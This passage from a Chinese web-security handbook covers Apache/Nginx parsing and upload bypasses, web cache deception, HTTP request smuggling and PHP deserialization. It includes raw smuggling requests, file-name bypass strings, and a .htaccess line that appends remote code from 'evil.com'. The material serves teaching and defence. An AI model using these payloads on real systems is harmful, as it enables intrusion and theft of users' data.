132 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
(续上页)
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt
目录遍历
配置 Options +Indexes 时 Apache 存在目录遍历漏洞。
CVE-2017-15715
%0A 绕过上传黑名单。
lighttpd
xx.jpg/xx.php
参考链接
• Apache 上传绕过
4.15.3 Nginx
Fast-CGI 关闭
在 Fast-CGI 关闭的情况下，Nginx 仍然存在解析漏洞：在文件路径 (xx.jpg) 后面加上 %00.php ，即 xx.
jpg%00.php 会被当做 php 文件来解析
Fast-CGI 开启
在 Fast-CGI 开启状态下，在文件路径后加上 /xx.php ，则 xx.jpg/xx.php 会被解析为 php 文件
CVE-2013-4547
a.jpg\x20\x00.php
配置错误
目录穿越
如果配置中存在类似location /foo { alias /bar/; }的配置时，/foo../会被解析为/bar/../从而导
致目录穿越的发生。
4.15. 中间件 133
Web-Sec Documentation, 发布 1.0
目录遍历
配置中 autoindex on 开启时，Nginx 中存在目录遍历漏洞。
参考链接
• CVE-2013-4547 Nginx 解析漏洞深入利用及分析
4.16 Web Cache 欺骗攻击
4.16.1 简介
网站通常都会通过如 CDN、负载均衡器、或者反向代理来实现 Web 缓存功能。通过缓存频繁访问的文件，
降低服务器响应延迟。
例如，网站 htttp://www.example.com 配置了反向代理。对于那些包含用户个人信息的页面，如 http://
www.example.com/home.php ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会
在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如 css 文件、js 文件、txt 文件、图
片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略 HTTP
缓存头。
Web cache 攻击类似于 RPO 相对路径重写攻击，都依赖于浏览器与服务器对 URL 的解析方式。当访问不
存在的URL时，如http://www.example.com/home.php/non-existent.css，浏览器发送get请求，依赖
于使用的技术与配置，服务器返回了页面 http://www.example.com/home.php 的内容，同时 URL 地址仍
然是 http://www.example.com/home.php/non-existent.css，http 头的内容也与直接访问 http://www.
example.com/home.php 相同，cacheing header、content-type（此处为 text/html）也相同。
4.16.2 漏洞成因
当代理服务器设置为缓存静态文件并忽略这类文件的 caching header 时，访问 http://www.example.com/
home.php/no-existent.css 时，会发生什么呢？整个响应流程如下：
1. 浏览器请求 http://www.example.com/home.php/no-existent.css ;
2. 服务器返回 http://www.example.com/home.php 的内容 (通常来说不会缓存该页面);
3. 响应经过代理服务器;
4. 代理识别该文件有 css 后缀;
5. 在缓存目录下，代理服务器创建目录 home.php ，将返回的内容作为 non-existent.css 保存。
134 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
4.16.3 漏洞利用
攻击者欺骗用户访问http://www.example.com/home.php/logo.png?www.myhack58.com,导致含有用户个
人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含 session 标识、安全问
题的答案，或者 csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开
可访问的。
4.16.4 漏洞存在的条件
漏洞要存在，至少需要满足下面两个条件：
1. web cache 功能根据扩展进行保存，并忽略 caching header;
2. 当访问如 http://www.example.com/home.php/non-existent.css 不存在的页面，会返回 home.php
的内容。
4.16.5 漏洞防御
防御措施主要包括 3 点：
1. 设置缓存机制，仅仅缓存 http caching header 允许的文件，这能从根本上杜绝该问题;
2. 如果缓存组件提供选项，设置为根据 content-type 进行缓存;
3. 访问 http://www.example.com/home.php/non-existent.css 这类不存在页面，不返回 home.php 的
内容，而返回 404 或者 302。
4.16.6 Web Cache 欺骗攻击实例
Paypal
Paypal 在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后 4 位数、交
易数据、emaill 地址等信息。受该攻击的部分页面包括：
• https://www.paypal.com/myaccount/home/attack.css
• https://www.paypal.com/myaccount/settings/notifications/attack.css
• https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details 。
4.16.7 参考链接
• practical web cache poisoning
• End-UsersGetManeuvered: EmpiricalAnalysisofRedirectionHijackinginContentDeliveryNetworks
4.16. Web Cache 欺骗攻击 135
Web-Sec Documentation, 发布 1.0
4.17 HTTP 请求走私
4.17.1 简介
HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇 文章 中被提出。
4.17.2 成因
请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为 HTTP 规
范提供了两种不同的方法来指定请求的结束位置，即 Content-Length 和 Transfer-Encoding 标头。
4.17.3 分类
• CLTE：前端服务器使用 Content-Length 头，后端服务器使用 Transfer-Encoding 头
• TECL：前端服务器使用 Transfer-Encoding 标头，后端服务器使用 Content-Length 标头。
• TETE：前端和后端服务器都支持 Transfer-Encoding 标头，但是可以通过以某种方式来诱导其中一
个服务器不处理它。
4.17.4 攻击
CL 不为 0 的 GET 请求
当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉
GET 请求中的 Content-Length 头，不进行处理。例如下面这个例子：
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n
GET /secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
前端服务器处理了 Content-Length ，而后端服务器没有处理 Content-Length ，基于 pipeline 机制认为这
是两个独立的请求，就造成了漏洞的发生。
CL-CL
根据 RFC 7230，当服务器收到的请求中包含两个 Content-Length ，而且两者的值不同时，需要返回 400
错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的 Content-Length 值时，
136 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
就会出现漏洞。例如：
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n
12345\r\n
a
这个例子中 a 就会被带入下一个请求，变为 aGET / HTTP/1.1\r\n 。
CL-TE
CL-TE 指前端服务器处理 Content-Length 这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉
Content-Length ，处理 Transfer-Encoding 。例如：
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a
这个例子中 a 同样会被带入下一个请求，变为 aGET / HTTP/1.1\r\n 。
TE-CL
TE-CL 指前端服务器处理 Transfer-Encoding 请求头，而后端服务器处理 Content-Length 请求头。例如：
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
(下页继续)
4.17. HTTP 请求走私 137
Web-Sec Documentation, 发布 1.0
(续上页)
\r\n
0\r\n
\r\n
TE-TE
TE-TE 指前后端服务器都处理 Transfer-Encoding 请求头，但是在容错性上表现不同，例如有的服务器可
能会处理 Transfer-encoding ，测试例如：
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
4.17.5 防御
• 禁用后端连接重用
• 确保连接中的所有服务器具有相同的配置
• 拒绝有二义性的请求
4.17.6 参考链接
RFC
• RFC 2616 Hypertext Transfer Protocol – HTTP/1.1
• RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing – HTTP/1.1
138 Chapter 4. 常见漏洞攻防
Web-Sec Documentation, 发布 1.0
Blog / Whitepaper
• HTTP Request Smuggling by chaiml
• HTTP request smuggling by portswigger
• 从一道题到协议层攻击之 HTTP 请求走私
• HTTP Request Smuggling in 2020
• h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)
4.17. HTTP 请求走私 139
Web-Sec Documentation, 发布 1.0
140 Chapter 4. 常见漏洞攻防
5
CHAPTER
语言与框架
5.1 PHP
5.1.1 后门
php.ini 构成的后门
利用 auto_prepend_file 和 include_path
.user.ini 文件构成的 PHP 后门
.user.ini 可运行于所有以 fastcgi 运行的 server。利用方式同 php.ini
5.1.2 反序列化
PHP 序列化实现
常见处理器
PHP 序列化处理共有几种，分别为 php、php_serialize、php_binary 和 WDDX(需要编译时开启支持)，默
认为 php，可通过配置中的 session.serialize_handler 修改。
141
Web-Sec Documentation, 发布 1.0
如果 PHP 编译时加入了 WDDX 支持，则只能用 WDDX，WDDX 从 PHP 7.4 版本后开始弃用。从 PHP
5.5.4 起可以使用 php_serialize。php_serialize 在内部简单地直接使用 serialize/unserialize 函数，并且不会
有 php 和 php_binary 所具有的限制。
其中 PHP 处理器的格式为：键名 + 竖线 + 经过 serialize() 函数序列化处理的值。
其中 php_binary 处理器的格式为：键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize() 函数序列化处
理的值。
其中 php_serialize 处理器的格式为：经过 serialize() 函数序列化处理的数组。
序列化格式
其中 php_serialize 的实现在 php-src/ext/standard/var.c 中，主要函数为 php_var_serialize_intern
，序列化后的格式如下：
• boolean
– b:;
– b:1; // true
– b:0; // false
• integer
– i:;
• double
– d:;
• NULL
– N;
• string
– s::"";
– s:1:"s";
• array
– a::{key, value};
– a:1:{s:4:"key1";s:6:"value1";} // array("key1" => "value1");
• object
– O::""::{};
• reference
– 指针类型
142 Chapter 5. 语言与框架
Web-Sec Documentation, 发布 1.0
– R:reference;
– O:1:"A":2:{s:1:"a";i:1;s:1:"b";R:2;}
– $a = new A();$a->a=1;$a->b=&$a->a;
private 与 protect
private 与 protect 变量和 public 变量不同，不能直接设置。
private 属性只能在其被定义的类内部访问，且不会被继承，在属性前加上类名，即 %00className%00 用于
标定其是私有的。
protected 属性可以在父类和子类中访问，变量前添加 %00*%00 用于标定其是受保护的。
PHP 反序列化漏洞
php 在反序列化的时候会调用 __wakeup / __sleep 等函数，可能会造成代码执行等问题。若没有相关函数，
在析构时也会调用相关的析构函数，同样会造成代码执行。
另外 __toString / __call 两个函数也有利用的可能。
其中__wakeup在反序列化时被触发，__destruct在GC时被触发，__toString在echo时被触发, __call
在一个未被定义的函数调用时被触发。
下面提供一个简单的 demo.
class Demo
{
public $data;
public function __construct($data)
{